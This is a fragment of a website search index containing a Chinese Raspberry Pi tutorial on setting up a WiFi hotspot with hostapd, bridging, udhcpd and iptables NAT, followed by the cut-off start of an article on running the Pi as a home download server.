\u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 4.10 \u542f\u52a8\u76f8\u5e94\u8f6f\u4ef6\uff0c\u5e76\u52a0\u5165\u542f\u52a8\u9879 sudo service hostapd start sudo service udhcpd start sudo update-rc.d hostapd enable sudo update-rc.d udhcpd enable 2013\u5e7412\u670812\u65e5\u66f4\u65b0 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5728\u7f51\u4e0a\u627e\u5230\u8fd9\u7bc7\u6587\u7ae0 \u300aWhy won't dnsmasq's DHCP server work when using hostapd?\u300b \uff0c\u6839\u636e\u5185\u5bb9\u6211\u5c06 /etc/default/ifplugd \u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u91cd\u542f\u4e86\u51e0\u6b21\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u4e00\u5207\u6b63\u5e38\uff01 \u539f\u6587\u94fe\u63a5\uff1a https://wangye.org/blog/archives/845/","title":"\u5c06\u6811\u8393\u6d3eRaspberry Pi\u8bbe\u7f6e\u4e3a\u65e0\u7ebf\u8def\u7531\u5668(WiFi\u70ed\u70b9AP,RTL8188CUS\u82af\u7247)"},{"location":"RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/#raspberry-piwifiaprtl8188cus","text":"\u63d0\u9192\uff1a \u672c\u9875\u9762\u5c06\u4e0d\u518d\u66f4\u65b0\u3001\u7ef4\u62a4\u6216\u8005\u652f\u6301\uff0c\u6587\u7ae0\u3001\u8bc4\u8bba\u6240\u53d9\u8ff0\u5185\u5bb9\u5b58\u5728\u65f6\u6548\u6027\uff0c\u6d89\u53ca\u6280\u672f\u7ec6\u8282\u6216\u8005\u8f6f\u4ef6\u4f7f\u7528\u65b9\u9762\u4e0d\u4fdd\u8bc1\u80fd\u591f\u5b8c\u5168\u6709\u6548\u53ef\u64cd\u4f5c\uff0c\u8bf7\u8c28\u614e\u53c2\u8003\uff01 \u6700\u8fd1\u53c8\u5f00\u59cb\u6298\u817e\u8d77Raspberry Pi\u6765\u4e86\uff0c\u56e0\u4e3a\u67d0\u5904\u4e0a\u7f51\u9700\u8981\u9510\u6377\u62e8\u53f7\uff0c\u4e8e\u662f\u6211\u5c31\u60f3\u80fd\u4e0d\u80fd\u8ba9\u6211\u7684\u6811\u8393\u6d3e\u4ee3\u52b3\uff0c\u5f53\u7136\u9996\u5148\u8981\u5c06\u5176\u6539\u9020\u4e3a\u8def\u7531\u5668\uff0c\u9ed8\u8ba4\u81ea\u5e26\u7684\u7f51\u53e3\u4f5c\u4e3aWAN\u53e3\uff0c\u6211\u4eec\u8fd8\u7f3a\u4e00\u4e2a\u7f51\u53e3\uff0c\u6728\u6709\u529e\u6cd5\uff0c\u53ea\u597d\u5360\u7528\u4e00\u4e2aUSB\u53e3\uff0c\u63a5\u4e0a\u4e00\u4e2aUSB\u7f51\u5361\uff0c\u7f51\u4e0a\u7684USB\u8f6cRJ45\u7f51\u7ebf\u53e3\u7684\u9002\u914d\u5668\u6bd4\u8f83\u5c11\uff0c\u4ef7\u683c\u4e5f\u4e0d\u4fbf\u5b9c\uff0c\u4e8e\u662f\u5c31\u8003\u8651\u5e72\u8106\u5c06\u5176\u6539\u9020\u6210\u65e0\u7ebf\u8def\u7531\uff0c\u4e5f\u7b26\u5408\u65f6\u4e0b\u9ad8\u7aef\u5927\u6c14\u4e0a\u6863\u6b21\u7684\u6807\u51c6\u3002 \u51c6\u5907\u5de5\u4f5c\uff0c\u5f53\u7136\u8981\u5148\u53bb\u8d2d\u4e70\u4e00\u4e2aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u53ef\u4ee5\u8d2d\u4e70\u7684\u578b\u53f7\u6bd4\u8f83\u591a\uff0cRaspberry Pi\u5b98\u65b9\u4e5f\u63d0\u4f9b\u4e86 \u517c\u5bb9\u6027\u5217\u8868 \u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5177\u4f53\u731b\u51fb\u8fd9\u91cc\u3002\u6211\u8fd9\u91cc\u8d2d\u4e70\u7684\u662f \u7f51\u4ef6\uff08Netgear\uff09WNA1000M 150M\u8ff7\u4f60USB\u65e0\u7ebf\u7f51\u5361 \u3002 \u8f83\u4e3a\u5b98\u65b9\u7684\u4ecb\u7ecd\u914d\u7f6e\u4e3a\u65e0\u7ebf\u70ed\u70b9\u7684\u6587\u7ae0\u83ab\u8fc7\u4e8e\u8fd9\u4e00\u7bc7 \u300aRPI-Wireless-Hotspot\u300b \u3002\u4f46\u662f\u5b9e\u9645\u914d\u7f6e\u4e0b\u6765\u59cb\u7ec8\u65e0\u6cd5\u6210\u529f\u3002\u4f46\u662f\u65e0\u7ebf\u7f51\u5361\u786e\u5b9e\u80fd\u591f\u88ab\u8bc6\u522b\uff0c\u53ef\u4ee5\u901a\u8fc7 lsusb \u548c lsmod \u67e5\u770b\u5230\uff0c\u4e0d\u8fc7\u6211\u6ce8\u610f\u5230\u8fd9\u6b3e\u65e0\u7ebf\u7684\u82af\u7247\u578b\u53f7\u662fRealTek RTL8188CUS\uff0c\u521d\u6b65\u6000\u7591\u662f\u9a71\u52a8\u95ee\u9898\u3002 \u5f53\u7136\u770b\u5230\u522b\u4eba\u7684\u8001\u6b3e\u65e0\u7ebf\u7f51\u5361\u90fd\u914d\u7f6e\u6210\u529f\u4e86\u5fc3\u91cc\u96be\u514d\u75d2\u75d2\u7684\uff0c\u5f53\u7136\u4e5f\u4e0d\u80fd\u518d\u6d6a\u8d39\u94f6\u5b50\u53bb\u518d\u4e70\u4e2a\u7f51\u5361\uff0c\u4e8e\u662f\u53ea\u597d\u81ea\u5df1\u6478\u7d22\uff0c\u4e0d\u8fc7\u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff0c\u5728N\u6b21\u5237\u673a\u91cd\u88c5\u7cfb\u7edf\u540e\uff0c\u7ec8\u4e8e\u627e\u5230\u4e86\u6210\u529f\u7684\u529e\u6cd5\uff0c\u5176\u5b9e\u5173\u952e\u7684\u6587\u7ae0\u5c31\u5728\u4e0a\u9762\u90a3\u7bc7\u6587\u7ae0\u7684\u4e00\u4e2a\u94fe\u63a5\u4e2d \u300aTurn Your Raspberry Pi Into a WiFi Hotspot with Edimax Nano USB EW-7811Un (RTL8188CUS chipset)\u300b \u3002 \u597d\u4e86\uff0c\u4e0b\u9762\u6211\u5c06\u5b9e\u8df5\u7684\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5f53\u7136 \u4e3b\u8981\u53c2\u8003\u4e86\u4e0a\u9762\u4e24\u7bc7\u6587\u7ae0 \uff0c\u8fd9\u91cc\u662f\u914d\u7f6e\u7684\u56de\u5fc6\uff0c\u6211\u5c3d\u91cf\u8bb0\u5f55\u8be6\u7ec6\uff0c\u9057\u6f0f\u4e4b\u5904\u671b\u6307\u51fa\u3002 1. \u5b89\u88c5\u7cfb\u7edf\uff08\u5982\u679c\u7cfb\u7edf\u5df2\u7ecf\u5b89\u88c5\u53ef\u4ee5\u8df3\u8fc7\u8fd9\u4e00\u6b65\uff09 1.1 \u5c3d\u91cf\u4f7f\u7528\u6700\u65b0\u7cfb\u7edf\uff0c\u9996\u5148\u4e0b\u8f7d \u5b98\u65b9\u6700\u65b0\u955c\u50cf \uff0c\u7136\u540e\u4f7f\u7528 Win32DiskImager \u70e7\u5f55\u5230SD\u5361\u4e0a\u3002\u6ce8\u610f\u8fd9\u91cc\u6211\u4eec\u9009\u7528\u7684\u662fRaspbian\u3002 1.2 Raspberry Pi\u8fde\u63a5\u4e0a\u65e0\u7ebf\u7f51\u5361\uff0c\u7136\u540e\u7cfb\u7edf\u955c\u50cf\u5237\u5165SD\u5361\u540e\uff0c\u6211\u4eec\u8fde\u63a5\u663e\u793a\u5668\u952e\u76d8\u548c\u9f20\u6807\u8fdb\u884c\u521d\u59cb\u5316\u914d\u7f6e\u5de5\u4f5c\uff0c\u5f53\u7136\u6ca1\u6709\u6761\u4ef6\u7684\u8bdd\u63a8\u8350\u76f4\u63a5\u4f7f\u7528SSH\u8fde\u63a5Raspberry Pi\uff0c\u8fd9\u6837\u66f4\u65b9\u4fbf\uff0c\u56e0\u4e3a\u65b0\u7cfb\u7edf\u9ed8\u8ba4\u5f00\u653e\u4e86SSH\u7ba1\u7406\u3002 \u8fde\u63a5\u4fe1\u606f\u4e3b\u8981\u5982\u4e0b\uff1a \u4e3b\u673a\u540d : raspberrypi \u7528\u6237\u540d : pi \u5bc6 \u7801 : raspberry \u5982\u679c\u4f60\u662f\u76f4\u63a5\u901a\u8fc7SSH\u8fde\u63a5\u5230Raspberry Pi\u7684\u8bdd\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u6b65\u9aa4\u662f\u5fc5\u8981\u7684\uff1a 1.2.1 \u521d\u59cb\u5316\u914d\u7f6e\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u53ea\u6709\u5728\u65b0\u5b89\u88c5\u7684\u7cfb\u7edf\u5185\u9700\u8981\uff0c\u4ec5\u505a\u4e00\u6b21\u3002 \u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u8fdb\u5165\u914d\u7f6e\u754c\u9762\uff1a sudo raspi-config \u63a8\u8350\u66f4\u65b0\u4e0b\u9762\u7684\u914d\u7f6e\u9009\u9879\uff08 \u65b0\u914d\u7f6e\u754c\u9762 \uff09\uff1a 1 Expand Filesystem 2 Change User Password 4 Internationalisation Options I1 Change Locale I2 Change Timezone 8 Advanced Options A3 Memory Split A6 Update \uff08 \u65e7\u914d\u7f6e\u754c\u9762 \uff09 update expand_rootfs change_pass change_timezone memory_split \u8fd9\u91cc\u8981\u6ce8\u610f Memory Split/memory_split \uff0c\u9ed8\u8ba4\u9884\u7559\u7ed9\u56fe\u5f62\u754c\u9762\u7684\u662f 64MB \uff0c\u4f5c\u4e3a\u4e00\u53f0\u65e0\u7ebf\u8def\u7531\u57fa\u672c\u4e0a\u5c31\u7528\u4e0d\u5230\u56fe\u5f62\u754c\u9762\u4e86\uff0c\u5f88\u663e\u7136 64MB \u7565\u6709\u5962\u4f88\uff0c\u6211\u4eec\u5c06\u5176\u6539\u6210 32MB \u3002 \u6700\u540e Finish \u5b8c\u6210\u521d\u59cb\u5316\u914d\u7f6e\u3002\u7cfb\u7edf\u4f1a\u81ea\u52a8\u63d0\u793a\u91cd\u542f\uff0c\u5982\u679c\u6ca1\u6709\u6309\u9884\u671f\u91cd\u542f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u91cd\u542f\u7cfb\u7edf\uff1a sudo shutdown -r now 2. \u5b89\u88c5hotspot(hostapd) sudo apt-get install bridge-utils hostapd hostapd\u5b9e\u73b0\u7684\u662f\u65e0\u7ebf\u5171\u4eab\uff0c \u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u7a0b\u5e8f\u4e0d\u517c\u5bb9RTL8188CUS\u82af\u7247\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u4e0d\u8fc7Edimax\u56e2\u961f\u4e3a\u6211\u4eec\u4e13\u95e8\u7f16\u8bd1\u4e86\u517c\u5bb9\u7684\u7248\u672c\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u9700\u8981\u66ff\u6362hostapd\u4e3a\u517c\u5bb9\u7248\u672c\u3002 \u66ff\u6362\u7684\u547d\u4ee4\u5982\u4e0b\uff1a wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip unzip hostapd.zip sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak sudo mv hostapd /usr/sbin/hostapd.edimax sudo ln -sf /usr/sbin/hostapd.edimax /usr/sbin/hostapd sudo chown root.root /usr/sbin/hostapd sudo chmod 755 /usr/sbin/hostapd \u63a5\u4e0b\u6765\u63d0\u4f9b\u4e24\u79cd\u65b9\u6848\uff0c\u4e00\u79cd\u662f\u6865\u63a5\u65b9\u5f0f\u8bbe\u7f6e\u70ed\u70b9\uff0c\u6709\u70b9\u7c7b\u4f3c\u4ea4\u6362\u673a\u5de5\u4f5c\u539f\u7406\uff0c\u5c06\u7f51\u7ebf\u53e3\u7684\u4fe1\u53f7\u8f6c\u6362\u4e3a\u65e0\u7ebf\uff0c\u53e6\u5916\u4e00\u79cd\u5219\u662f\u8def\u7531\u65b9\u5f0f\u5b9e\u73b0\u65e0\u7ebf\u4e0a\u7f51\uff0c\u548c\u5927\u90e8\u5206\u8def\u7531\u5668\u5de5\u4f5c\u65b9\u5f0f\u4e00\u6837\u3002 3. \u6865\u63a5\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e00\uff09 3.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install bridge-utils 3.2 \u914d\u7f6e\u7f51\u5361 \u7f16\u8f91\u7f51\u5361\u914d\u7f6e\u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #allow-hotplug wlan0 #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u52a0\u4e0a\u4e0b\u9762\u8fd9\u6bb5\u6865\u63a5\u914d\u7f6e\uff1a auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 \u6700\u7ec8\u7684\u914d\u7f6e\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a #loopback adapter auto lo iface lo inet loopback #wired adapter iface eth0 inet dhcp #bridge auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 3.3 \u914d\u7f6ehostapd sudo nano /etc/hostapd/hostapd.conf \u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv bridge=br0 ssid=My_SSID_Name channel=1 wmm_enabled=0 wpa=1 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP auth_algs=1 macaddr_acl=0 \u914d\u7f6e\u6587\u4ef6\u5177\u4f53\u6211\u5c31\u4e0d\u8bf4\u4e86\uff0c\u60f3\u5fc5\u5927\u5bb6\u770b\u5185\u5bb9\u4e5f\u77e5\u9053\u5404\u9879\u7684\u542b\u4e49\uff0c\u4fdd\u5b58\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002 3.4 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" \u6865\u63a5\u65b9\u5f0f\u914d\u7f6e\u5b8c\u6210\uff01 4. \u8def\u7531\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e8c\uff09 4.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install udhcpd udhcpd\u4e3b\u8981\u4e3a\u8fde\u63a5\u5230WiFi\u7684\u8bbe\u5907\u81ea\u52a8\u5206\u914dIP\u5730\u5740\u7684\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u6362\u7528\u4f60\u6240\u719f\u6089\u7684\u8f6f\u4ef6\u3002 4.2 \u914d\u7f6eudhcpd\uff0c\u7f16\u8f91 /etc/udhcpd.conf \uff0c\u4e3b\u8981\u5185\u5bb9\u5982\u4e0b\uff1a start 192.168.42.2 # This is the range of IPs that the hostspot will give to client devices. end 192.168.42.20 interface wlan0 # The device uDHCP listens on. remaining yes opt dns 8.8.8.8 4.2.2.2 # The DNS servers client devices will use. opt subnet 255.255.255.0 opt router 192.168.42.1 # The Pi's IP address on wlan0 which we will set up shortly. opt lease 864000 # 10 day DHCP lease time in seconds \u63a5\u4e0b\u6765\u7f16\u8f91 /etc/default/udhcpd \u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 4.3 \u914d\u7f6e\u65e0\u7ebf\u7f51\u5361 \u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u7ed9\u65e0\u7ebf\u7f51\u5361\u8bbe\u7f6e\u4e00\u4e2aIP\u5730\u5740\uff1a sudo ifconfig wlan0 192.168.42.1 \u5f53\u7136\u4e3a\u4e86\u4e0b\u6b21\u542f\u52a8\u4ecd\u7136\u6709\u6548\uff0c\u6211\u4eec\u9700\u8981\u914d\u7f6e /etc/network/interfaces \u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u6ce8\u610f\u4fdd\u7559 allow-hotplug wlan0 \uff0c\u82f1\u6587\u539f\u6587\u662f\u4e0d\u4fdd\u7559\u7684\uff0c\u4f46\u662f\u6211\u64cd\u4f5c\u4e0b\u6765\u53d1\u73b0\u5982\u679c\u4e0d\u4fdd\u7559\u8fd9\u6bb5\u7684\u8bdd\uff0c\u65e0\u7ebf\u7f51\u5361\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u914d\u7f6eIP\uff0c\u6700\u540e\u65e0\u7ebf\u7f51\u5361IP\u7684\u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a allow-hotplug wlan0 iface wlan0 inet static address 192.168.42.1 netmask 255.255.255.0 4.4 \u7f16\u8f91hostapd\u914d\u7f6e sudo nano /etc/hostapd/hostapd.conf \u5185\u5bb9\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv ssid=My_SSID_Name hw_mode=g channel=6 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP 4.7 \u542f\u52a8IP\u8f6c\u5411\u529f\u80fd\u4ee5\u4fbf\u4e8e\u5f00\u901aNAT sudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\" \u7f16\u8f91 /etc/sysctl.conf \u6539\u52a8\u4e0b\u9762\u8fd9\u884c\uff1a net.ipv4.ip_forward=1 4.8 \u914d\u7f6eiptables\u9632\u706b\u5899 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT \u5230\u8fd9\u91cc\u8def\u7531\u7684NAT\u529f\u80fd\u5df2\u7ecf\u88ab\u542f\u7528\uff0c\u6211\u4eec\u5c06\u521a\u624d\u914d\u7f6e\u7684iptables\u4fdd\u5b58\u4e0b\u6765\u4ee5\u4fbf\u4e8e\u4e0b\u6b21\u4f7f\u7528\uff1a sudo sh -c \"iptables-save > /etc/iptables.ipv4.nat\" \u7f16\u8f91 /etc/network/interfaces \u7136\u540e\u5728\u6700\u540e\u52a0\u4e0a\u4e0b\u9762\u8fd9\u884c\u4ee5\u4f7f\u6bcf\u6b21\u542f\u52a8\u90fd\u81ea\u52a8\u52a0\u8f7diptables\u914d\u7f6e\uff1a up iptables-restore < /etc/iptables.ipv4.nat 4.9 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 4.10 \u542f\u52a8\u76f8\u5e94\u8f6f\u4ef6\uff0c\u5e76\u52a0\u5165\u542f\u52a8\u9879 sudo service hostapd start sudo service udhcpd start sudo update-rc.d hostapd enable sudo update-rc.d udhcpd enable 2013\u5e7412\u670812\u65e5\u66f4\u65b0 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5728\u7f51\u4e0a\u627e\u5230\u8fd9\u7bc7\u6587\u7ae0 \u300aWhy won't dnsmasq's DHCP server work when using hostapd?\u300b \uff0c\u6839\u636e\u5185\u5bb9\u6211\u5c06 /etc/default/ifplugd \u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u91cd\u542f\u4e86\u51e0\u6b21\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u4e00\u5207\u6b63\u5e38\uff01 \u539f\u6587\u94fe\u63a5\uff1a https://wangye.org/blog/archives/845/","title":"\u5c06\u6811\u8393\u6d3eRaspberry Pi\u8bbe\u7f6e\u4e3a\u65e0\u7ebf\u8def\u7531\u5668(WiFi\u70ed\u70b9AP,RTL8188CUS\u82af\u7247)"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/","text":"\u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09 \u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09 \u6811\u8393\u6d3e\u4e70\u56de\u6765\u540e\u5e72\u4ec0\u4e48\u5462\uff1f\u5148\u9a71\u4eec\u544a\u8bc9\u6211\uff1a\u73a9\u51e0\u5929\u5c31\u817b\u4e86\uff0c\u7b49\u7740\u653e\u7284\u89d2\u65ee\u65ef\u91cc\u5403\u7070\u5427\u3002 \u6211\u7814\u7a76\u4e86\u77e5\u4e4e\u4e0a\u7684 \u6811\u8393\u6d3e\u73a9\u6cd5\u5927\u5168 \uff0c\u53d1\u73b0\u5982\u679c\u6ca1\u6709\u4e70\u5176\u4ed6\u6269\u5c55\u786c\u4ef6\u7684\u8bdd\uff0c\u7528\u6811\u8393\u6d3e\u642d\u5efa\u4e00\u4e2a24\u5c0f\u65f6\u5f00\u673a\u7684\u4e0b\u8f7d\u670d\u52a1\u5668\u662f\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002 \u9047\u5230\u7684\u96be\u70b9\u548c\u89e3\u51b3\u529e\u6cd5 \u65e2\u7136\u662f\u4e0b\u8f7d\u670d\u52a1\u5668\u5c31\u4e0d\u80fd\u53ea\u5728\u5bb6\u91cc\u4f7f\u7528\uff0c\u9700\u8981\u652f\u6301\u8fdc\u7a0b\u8bbf\u95ee\u3002\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u76ee\u524d\u5bb6\u91cc\u5b89\u88c5\u7684\u90fd\u662f\u8054\u901a\u7684ADSL\uff0c\u516c\u7f51IP\u662f\u7ecf\u5e38\u53d1\u751f\u53d8\u5316\u7684\uff0c\u5982\u4f55\u5b9e\u65f6\u83b7\u53d6\u5bb6\u91cc\u6811\u8393\u6d3e\u7684IP\u5730\u5740\u8fdb\u884c\u8bbf\u95ee\u5462\uff1f \u89e3\u51b3\u529e\u6cd5\u5982\u4e0b\uff1a \u9996\u5148\u767b\u5f55\u5bb6\u91cc\u7684\u8def\u7531\u5668\uff0c\u7ed9\u6811\u8393\u6d3e\u6307\u5b9a\u4e00\u4e2a\u56fa\u5b9a\u7684\u9759\u6001\u5185\u7f51IP\u5730\u5740\u3002 \ufffc \u4f7f\u7528\u8def\u7531\u5668\u91cc\u7684DHCP\u9759\u6001IP\u5206\u914d\u529f\u80fd\u6307\u5b9aIP\u5730\u5740\uff08\u57fa\u672c\u6240\u6709\u8def\u7531\u5668\u90fd\u6709\u8fd9\u4e2a\u529f\u80fd\uff0c\u4f46\u83dc\u5355\u4f4d\u7f6e\u4e0d\u4e00\u6837\uff09 \u8fd9\u91cc\u6211\u8bbe\u7f6e\u4e86192.168.31.88 \u4f5c\u4e3a\u6811\u8393\u6d3e\u7684\u9759\u6001\u5185\u7f51IP\u5730\u5740\u3002 \u7136\u540e\u5f00\u542f\u8def\u7531\u5668\u91cc\u7684DMZ\u529f\u80fd\uff0c\u6307\u5411\u8fd9\u4e2a\u9759\u6001IP\u5730\u5740\uff0c\u8fd9\u6837\u901a\u8fc7\u516c\u7f51IP\u5c31\u80fd\u8bbf\u95ee\u5230\u6811\u8393\u6d3e\u4e86\u3002 \ufffc\ufffc \u90a3\u5982\u4f55\u5b9e\u65f6\u83b7\u53d6\u516c\u7f51\u5730\u5740\u5462\uff1f \u5199\u4e86\u4e0b\u9762\u4e00\u6bb5Python\u4ee3\u7801\uff0c\u5b9e\u73b0\u7684\u65b9\u6cd5\u662f\uff1a 